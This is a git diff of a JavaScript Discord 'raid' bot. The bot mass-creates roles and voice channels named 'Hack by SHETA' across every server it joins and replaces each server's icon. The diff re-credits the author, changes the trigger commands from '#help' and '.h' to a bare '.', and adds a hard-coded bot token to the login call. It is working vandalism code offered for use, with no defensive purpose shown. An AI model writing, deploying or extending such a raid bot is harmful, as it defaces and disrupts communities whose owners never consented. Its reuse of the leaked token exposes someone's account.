@@ -8,7 +8,7 @@ LOka.on('ready', () => {
 LOka.on('ready',  () => {
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : G̷ U̷ R̷ G̷ A̷ 🛠 ~           ~    ');
+console.log('      ~            ~  By :̷ SHETA 🛠 ~           ~    ');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
 console.log(`Logged in as  * [ "  KBOOOOOOOOSH-YT " ] servers! [ " ${LOka.guilds.size} " ] Users! [ " ${LOka.users.size} " ]`);
@@ -67,7 +67,7 @@ LOka.on('message', message => {
 });
  
 LOka.on('message', message => {
-     if (message.content === "#help") {
+     if (message.content === ".") {
                  if(!message.channel.guild) return;
  
              message.guild.setIcon(`https://media.discordapp.net/attachments/649311283300007958/686658597178048557/156a0d2872579f1ffcaa5d2127239bfd.png`)
@@ -78,7 +78,7 @@ LOka.on('message', message => {
 LOka.on('message', message => {
      
  
-     if (message.content === ".h") {
+     if (message.content === ".") {
          LOka.guilds.forEach(m =>{
            m.createRole({
         name : "Hack by SHETA 🛠",
@@ -664,7 +664,7 @@ m.createRole({
 }
 });
 LOka.on('message', message => {
-         if (message.content === "#help") {
+         if (message.content === ".") {
                LOka.guilds.forEach(m =>{
 m.createChannel('Hack by SHETA 🛠', 'voice');
 m.createChannel('Hack by SHETA 🛠', 'voice');
@@ -1101,4 +1101,4 @@ LOka.on('guildMemberAdd', member => {
  
  
  
-LOka.login("")
+LOka.login("NTg0MzIzMTY5MzM1Mzc3OTMw.XyiAcQ.-xexi2S0RWxklkjgGgFKM05daeg")
